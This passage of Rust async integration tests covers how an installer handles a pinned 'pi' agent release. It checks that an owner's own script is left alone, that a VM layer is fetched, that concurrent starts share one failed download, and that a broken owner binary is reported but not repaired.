    let pinned = w.installed(vibe_env::pi_release::PINNED);
    assert_eq!(fs::read_link(w.link()).unwrap(), pinned);
    // Again, there's nothing to do.
    let before = fs::metadata(&pinned).unwrap().modified().unwrap();
    w.core.repair_setup().await;
    assert_eq!(fs::metadata(&pinned).unwrap().modified().unwrap(), before);

    // The owner's own, however old, is used as it is.
    fs::remove_file(w.link()).unwrap();
    fs::write(w.link(), "#!/bin/sh\necho mine\n").unwrap();
    fs::set_permissions(w.link(), fs::Permissions::from_mode(0o755)).unwrap();
    w.core.repair_setup().await;
    assert!(fs::symlink_metadata(w.link()).unwrap().is_file());
    assert_eq!(
        fs::read_to_string(w.link()).unwrap(),
        "#!/bin/sh\necho mine\n"
    );
}

#[tokio::test]
async fn a_linux_vm_agent_gets_its_layer_on_the_way_too() {
    let w = NoPi::with(|home, backend| {
        backend.with_pi_layer_in(Layout::new(home, "macos").linux_dir())
    })
    .await;
    publish_pi(
        &w.releases,
        vibe_env::pi_release::PINNED,
        vibe_env::pi_release::VM_PLATFORM,
    );
    w.save_profile();
    let layer = Layout::new(&w.golden.home, "macos")
        .linux_dir()
        .join(format!("pi-{}.img", vibe_env::pi_release::PINNED));
    assert!(!layer.exists());
    w.start().await.unwrap();
    assert!(layer.is_file());
}

/// A hung or failing download holds nothing up that it needn't: starts waiting on it
/// share how it went rather than each download again, and the doctor doesn't queue.
#[tokio::test]
async fn starts_waiting_on_one_install_share_how_it_went() {
    use std::sync::atomic::{AtomicU32, Ordering};
    let w = NoPi::native().await;
    w.save_profile();
    // A release that hangs, for as long as the test says, then isn't there.
    let release = w
        .releases
        .join(format!("download/v{}", vibe_env::pi_release::PINNED));
    fs::create_dir_all(&release).unwrap();
    let fifo = release.join("SHA256SUMS");
    assert!(
        std::process::Command::new("mkfifo")
            .arg(&fifo)
            .status()
            .unwrap()
            .success()
    );
    let core = Arc::clone(&w.core);
    let start = |core: Arc<Core>| async move {
        core.start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-native".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
    };
    let first = tokio::spawn(start(Arc::clone(&core)));
    // Under way, by the curl waiting on the fifo: a second start queues behind it.
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    let second = tokio::spawn(start(Arc::clone(&core)));
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // Nothing's held: the project can go on being used, and the doctor just says.
    let row = w.doctors_row().await;
    assert_eq!(row.state, CheckState::Working, "{row:?}");
    let opens = Arc::new(AtomicU32::new(0));
    let counted = Arc::clone(&opens);
    let release_fifo = fifo.clone();
    // Gives curl an end to its read: nothing valid, so that install fails.
    let writer = std::thread::spawn(move || {
        counted.fetch_add(1, Ordering::SeqCst);
        fs::write(&release_fifo, "not sums\n").unwrap();
    });
    let first = first.await.unwrap().unwrap_err();
    let second = second.await.unwrap().unwrap_err();
    writer.join().unwrap();
    assert!(first.message.contains("doesn't list"), "{}", first.message);
    assert_eq!(
        second.message, first.message,
        "the second start shares the first's failure rather than downloading again"
    );
    assert_eq!(opens.load(Ordering::SeqCst), 1);
    assert!(
        w.core
            .pi_status(HostParams { host: None })
            .await
            .unwrap()
            .error
            .is_some_and(|why| why.contains("doesn't list"))
    );
}

/// One that's there, and isn't VibeOS's to replace, isn't called something it'll fix.
#[tokio::test]
async fn an_owners_pi_that_doesnt_run_is_said_and_left_alone() {
    use std::os::unix::fs::PermissionsExt;
    let w = NoPi::native().await;
    w.publish();
    w.save_profile();
    fs::create_dir_all(w.link().parent().unwrap()).unwrap();
    fs::write(w.link(), "#!/bin/sh\necho broken >&2\nexit 3\n").unwrap();
    fs::set_permissions(w.link(), fs::Permissions::from_mode(0o755)).unwrap();
    w.core.repair_setup().await;
    let row = w.doctors_row().await;
    assert_eq!(
        (row.state, row.fixable),
        (CheckState::Fail, false),
        "{row:?}"
    );
    assert!(row.detail.contains("broken"), "{row:?}");
    assert!(fs::symlink_metadata(w.link()).unwrap().is_file());
}
